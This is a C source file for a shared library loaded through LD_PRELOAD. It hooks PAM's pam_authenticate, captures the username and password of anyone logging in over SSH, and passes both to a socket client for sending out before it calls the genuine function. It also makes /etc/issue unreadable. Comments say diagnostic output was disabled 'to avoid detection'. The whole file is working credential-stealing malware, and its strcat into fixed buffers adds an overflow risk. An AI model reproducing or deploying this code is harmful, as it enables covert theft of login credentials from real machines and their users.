#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include "socket/client/client.h"
#include <sys/stat.h>

typedef int (*pam_authenticate_t)(pam_handle_t *, int);

//this function's role is to retrieve and store the username used to connect to a remote machine with SSH

char *get_username(pam_handle_t *pamh) {
    char *username = NULL;

    if (pam_get_item(pamh, PAM_USER, (const void **)&username) == PAM_SUCCESS && username) {
//        fprintf(stderr, "USER =>>>>> %s\n", username); this line was commented to avoid detection but can be used for demonstration purposes

    } else {
        perror("Failed to retrieve username");
    }
    return username;
}

//this function's role is to retrieve and store the password that the user used to access his machine with SSH
char *get_password(pam_handle_t *pamh) {
    struct pam_conv *conv;
    
    if (pam_get_item(pamh, PAM_CONV, (const void **)&conv) == PAM_SUCCESS && conv) {
        const struct pam_message msg = {
            .msg_style = PAM_PROMPT_ECHO_OFF,
            .msg = "Password: "
        };
        const struct pam_message *msgp = &msg;
        struct pam_response *resp = NULL;

        int ret = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
        if (ret == PAM_SUCCESS && resp && resp->resp) {
//            fprintf(stderr, "PASSWORD =>>>>>: %s\n", resp->resp); this line was commented to avoid detection but can be used for demonstration purposes
	    char *password = strdup(resp->resp);

            free(resp->resp);
            free(resp);

	    return password;
        } else {
            fprintf(stderr, "Failed to retrieve password1\n");
        }
    } else {
        fprintf(stderr, "Failed to retrieve password2\n");
    }

    return NULL;
}

//this function's role is to impersonate the authentic pam_authenticate function thanks to LD_PRELOAD
int pam_authenticate(pam_handle_t *pamh, int flags) {

    int8_t result = chmod("/etc/issue", 000);
    if (result == -1) {
        perror("chmod failed");
    }

    static pam_authenticate_t original_pam_authenticate = NULL;

    if (!original_pam_authenticate) {
        original_pam_authenticate = (pam_authenticate_t)dlsym(RTLD_NEXT, "pam_authenticate");
        if (!original_pam_authenticate) {
//            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror()); this line was commented to avoid detection but can be used for demonstration purposes
            exit(EXIT_FAILURE);
        }
    }

    char *username = get_username(pamh);
    char username_text[100] = "USERNAME : ";
    char *pwd = get_password(pamh);
    char pwd_text[100] = "PASSWORD : ";
    strcat(username_text,username); 
    strcat(pwd_text,pwd); 
    send_credentials_client(username_text); 
    send_credentials_client(pwd_text); 

    return original_pam_authenticate(pamh, flags);
}
